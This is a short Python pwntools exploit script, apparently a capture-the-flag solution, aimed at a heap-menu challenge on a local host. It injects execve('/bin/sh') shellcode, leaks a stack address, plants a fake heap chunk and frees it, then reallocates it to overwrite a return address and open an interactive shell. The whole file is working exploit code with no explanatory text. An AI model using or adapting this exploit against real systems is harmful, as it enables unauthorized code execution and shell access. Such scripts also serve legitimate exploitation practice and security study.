
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')

io = remote("172.17.0.2", 1234)
raw_input("go")

# who are u?
sc = asm(shellcraft.execve("/bin/sh"))
io.sendafter("?\n", sc.ljust(48, '0'))
rbpAddr = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00'))
success("rbpAddr -> {:#x}".format(rbpAddr))
scAddr = rbpAddr - 0x50
fakeChunk = rbpAddr - 0x90

# give me your id
io.sendlineafter("?\n", str(0x20)) # id

# give me money
payload = p64(0) * 5 + p64(0x41)
payload = payload.ljust(0x40 - 8, '\x00') + p64(fakeChunk)
io.sendlineafter("~\n", payload)

# free
io.sendlineafter(": ", "2")

# malloc
io.sendlineafter(": ", "1")
io.sendlineafter("?\n", str(0x30))
payload = 'a' * 0x18 + p64(scAddr)
payload = payload.ljust(48, '\x00')
io.send(payload)

# ret
io.sendlineafter(": ", "3")
io.interactive()
io.close()
